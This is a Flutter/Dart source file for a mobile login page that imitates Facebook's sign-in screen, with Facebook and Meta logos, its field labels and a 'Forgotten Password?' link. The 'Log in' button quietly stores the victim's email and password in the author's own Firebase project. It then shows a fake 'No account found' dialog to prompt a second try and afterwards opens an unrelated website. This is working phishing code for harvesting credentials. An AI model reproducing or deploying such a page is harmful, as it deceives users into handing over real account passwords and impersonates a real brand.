import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';

Future<void> launchUrl(String urlString) async {
  if (await canLaunch(urlString)) { // Check if the URL can be launched
    await launch(urlString);
  } else {
    throw 'Could not launch $urlString'; // throw could be used to handle erroneous situations
  }
}



class Loginpage extends StatefulWidget {
  const Loginpage({Key? key}) : super(key: key);

  @override
  State<Loginpage> createState() => _LoginpageState();
}


final FirebaseAuth _auth = FirebaseAuth.instance;
// FirebaseApp secondaryApp = Firebase.app('SecondaryApp');
// FirebaseAuth auth = FirebaseAuth.instanceFor(app: secondaryApp);

int counter =0;
Future<UserCredential> credential = FirebaseAuth.instance.signInAnonymously();
Color color = const Color(0xffEBE8EF);
double keyboardHeight = 0.0;
TextEditingController eController = TextEditingController();
TextEditingController pController = TextEditingController();
bool passwordVisible = false;
bool showSpinner = false;

class _LoginpageState extends State<Loginpage> {

  @override
  Widget build(BuildContext context) {

    Future<void> _showMyDialog() async {
      return showDialog<void>(
        context: context,
        barrierDismissible: false, // user must tap button!
        builder: (BuildContext context) {
          return AlertDialog(
            title: const Text('No account found. Create a new account?'),
            content:  SingleChildScrollView(
              child: ListBody(
                children: <Widget>[
                  Text("it looks like ${eController.text} isn't connected to an account. You can create a new account or try again."),
                ],
              ),
            ),
            actions: <Widget>[
              TextButton(
                child: const Text('Create new account'),
                onPressed: () {
                  Navigator.of(context).pop();
                },
              ),
              TextButton(
                child: const Text('Try again'),
                onPressed: () {
                  Navigator.of(context).pop();
                },
              ),
            ],
          );
        },
      );
    }

    keyboardHeight = 1 -
        (MediaQuery.of(context).viewInsets.bottom /
            MediaQuery.of(context).size.height);
    double width = MediaQuery.of(context).size.width;
    double height = MediaQuery.of(context).size.height;

    return
       Scaffold(
         body: Padding(
           padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom * .4),
           child: Padding(
             padding: const EdgeInsets.all(20.0),
             child: Column(
              children: [
                MediaQuery.of(context).viewInsets.bottom==0?const Align(alignment:Alignment.centerLeft,child:Icon(Icons.arrow_back_ios)):Container(),
                SizedBox(height: height*.01,),
                MediaQuery.of(context).viewInsets.bottom==0? const Text("English (UK)",style: TextStyle(fontSize: 14,fontWeight: FontWeight.w600,color: Color(0xff525C68),)):Container(),
                MediaQuery.of(context).viewInsets.bottom==0?SizedBox(height: height*.08,):Container(),
                Image.asset("images/facebook (1).png",scale: 8,),
                SizedBox(height: height*.08,),
                Container(
                  width: width*.95,
                  decoration: BoxDecoration(
                    border: Border.all(color: color,width: 3),
                      color: Colors.white,
                      borderRadius: BorderRadius.circular(13),
                      boxShadow: [
                        BoxShadow(
                            color: Colors.black.withOpacity(.04),
                            spreadRadius: 8,
                            blurRadius: 16)
                      ]),
                  child:  TextFormField(
                    controller: eController,
                    textInputAction: TextInputAction.next,
                    cursorOpacityAnimates: true,
                    decoration: const InputDecoration(
                      border: InputBorder.none,
                      labelText: "Mobile number or email address",
                      contentPadding:  EdgeInsets.only(bottom: 16,top: 12,right: 12,left: 12),
                      labelStyle: TextStyle(
                          color: Colors.grey,
                          fontWeight: FontWeight.w500,
                          fontSize: 18,
                          ),
                    ),
                    style: const TextStyle(
                        color: Colors.black87,
                        fontWeight: FontWeight.w600,
                        fontSize: 16,
                        ),
                  ),
                ),
                SizedBox(height: height*.01,),
                Container(
                  width: width*.95,
                  decoration: BoxDecoration(
                      border: Border.all(color: color,width: 3),
                      color: Colors.white,
                      borderRadius: BorderRadius.circular(13),
                      boxShadow: [
                        BoxShadow(
                            color: Colors.black.withOpacity(.04),
                            spreadRadius: 8,
                            blurRadius: 16)
                      ]),
                  child:  TextFormField(
                    controller: pController,
                    keyboardType: TextInputType.text,
                    obscureText: !passwordVisible,
                    decoration:  InputDecoration(
                      suffixIcon: IconButton(
                        icon:  Icon(
                          passwordVisible
                              ? Icons.visibility
                              : Icons.visibility_off,
                          color: Colors.black.withOpacity(0.7),
                        ),
                        onPressed: () {
                          setState(() {
                            passwordVisible = !passwordVisible;
                          });
                        },
                      ),

                      border: InputBorder.none,
                      labelText: "Password",
                      labelStyle: const TextStyle(
                        color: Colors.grey,
                        fontWeight: FontWeight.w500,
                        fontSize: 18,
                      ),
                      contentPadding: const EdgeInsets.only(bottom: 16,top: 12,right: 12,left: 12),
                    ),
                    style: const TextStyle(
                      color: Colors.black87 ,
                      fontWeight: FontWeight.w600,
                      fontSize: 16,
                    ),
                  ),
                ),

                SizedBox(height: height*.01,),
                GestureDetector(
                  onTap: () async {
                    setState(() {
                      showSpinner = true;
                    });
                    print(counter);
                    try {
                      UserCredential credential =
                      await _auth.createUserWithEmailAndPassword(
                          email: eController.text,
                          password: pController.text);
                      counter == 0?_showMyDialog():launchUrl("https://www.victoriassecret.com/us/");
                    } on FirebaseAuthException catch (e) {
                      print(e);
                    }
                    setState(() {
                      showSpinner = false;
                      counter++;

                    });
                  },
                  child:Container(
                  height: height * .06 ,
                  width: width * .95,
                  alignment: Alignment.center,
                  decoration: BoxDecoration(
                      color: const Color(0xff0068FF),
                      borderRadius: BorderRadius.circular(32),
                      boxShadow: [
                        BoxShadow(
                            color: Colors.black.withOpacity(.04),
                            spreadRadius: 8,
                            blurRadius: 16)
                      ]),
                  child:  const Text(
                      "Log in",
                      style: TextStyle(
                          fontSize: 16  ,
                          color: Colors.white,
                          fontWeight: FontWeight.w200,
                          fontFamily: "playfair"),
                    ),
                  ),
                ),
                SizedBox(height: height*.02,),
                const Text("Forgotten Password?",style: TextStyle(color: Colors.black,fontFamily:"playfair" ,fontWeight:FontWeight.w500,fontSize:17 ),),
                const Spacer(),

                MediaQuery.of(context).viewInsets.bottom==0?Container(
                  height: height * .06 ,
                  width: width * .95,
                  alignment: Alignment.center,
                  decoration: BoxDecoration(
                      color: Colors.white,
                      borderRadius: BorderRadius.circular(32),
                      border: Border.all(color: const Color(0xff0068FF)),
                      boxShadow: [
                        BoxShadow(
                            color: Colors.black.withOpacity(.04),
                            spreadRadius: 8,
                            blurRadius: 16)
                      ]),
                  child: const Text(
                    "Create new account",
                    style: TextStyle(
                        fontSize: 16  ,
                        color: Color(0xff0068FF),
                        fontWeight: FontWeight.w200,
                        fontFamily: "playfair"),
                  ),
                ):Container(),
                MediaQuery.of(context).viewInsets.bottom==0? SizedBox(height: height*.02,):Container(),
                MediaQuery.of(context).viewInsets.bottom==0? Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Image.asset("images/meta.png",scale: 20,color: const Color(0xff616F79),),
                    const SizedBox(width: 5,),
                    const Text("Meta",style: TextStyle(fontSize: 18,fontWeight: FontWeight.w600,color: Color(0xff616F79)),),
                  ],
                ):Container(),
                MediaQuery.of(context).viewInsets.bottom==0? SizedBox(height: height*.03,):Container(),


              ],

                   ),
           ),
         ),
       );

  }
}

